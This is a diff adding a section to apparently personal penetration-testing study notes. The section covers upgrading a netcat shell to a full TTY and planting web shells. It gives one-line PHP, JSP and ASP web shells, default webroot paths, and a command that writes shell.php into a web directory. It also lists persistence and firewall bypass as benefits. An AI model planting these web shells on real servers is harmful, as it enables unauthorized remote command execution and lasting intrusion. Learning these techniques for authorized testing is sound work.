@@ -72,3 +72,67 @@ It's better because we can now interrupt shell from our side, and we decide to c
 Netcat sucks. You can move text cursor, nor you can access command history with up and down. 
 
 But we can do that, we need to upgrade our connection to TTY. We can map our terminal TTY to remote TTY.
+
+### TTY upgrade with `python/stty`
+
+On our machine we run 
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+After the command - `ctrl+z` to background our shell 
+then we run:
+```bash
+stty raw -echo
+fg
+```
+After `fg` it will bring our `netcat` to foreground. The terminal will show blank line. We can hit enter again to get back to our shell or input reset and hit enter to bring it back.
+
+It's possible to change `stty` window side.
+We get variables
+```bash
+echo $TERM
+stty size
+```
+now we can set them
+```bash
+export TERMP=xterm-256color
+stty rows 67 columns 318
+```
+
+## Web Shell
+
+Web shell is usually an injected PHP or ASPX script that accepts our commands through HTTP request parameters such as `GET` or `POST` executes the command and print its output back.
+
+Short web shell scripts
+```php
+<?php system($_REQUEST["cmd"]); ?>
+```
+```jsp
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+```asp
+<% eval request("cmd") %>
+```
+
+Once we can execute commands we need to place our shell script into remote host web directory. This cn be done through a vulnerability in an upload feature.
+
+Default webroots for common webservers
+
+| Web server | Default Webroot |
+| - | - | 
+| Apache | `/var/www/html/` |
+| Nginx | `/usr/local/nginx/html` |
+| IIS | `c:\inetpub\wwwroot` |
+| XAMPP | `C:\xampp\htdocs` |
+
+If we knew the directory we could write our `.php` (or any script) file.
+```bash
+echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+```
+
+Now to access our web shell we would just cURL into the website using `shell.php` with paramter `?cmd=` which value would be the command we would like to execute
+
+Web shell benefits:
+- Bypasses firewalls as the server itself is issuing the commands through the OS which was exploited by using a web site 
+- Even if the compromised host is rebooted the exploit file is still there
+Disadvantage of web shell are is that it's not as interactive as the other shells.
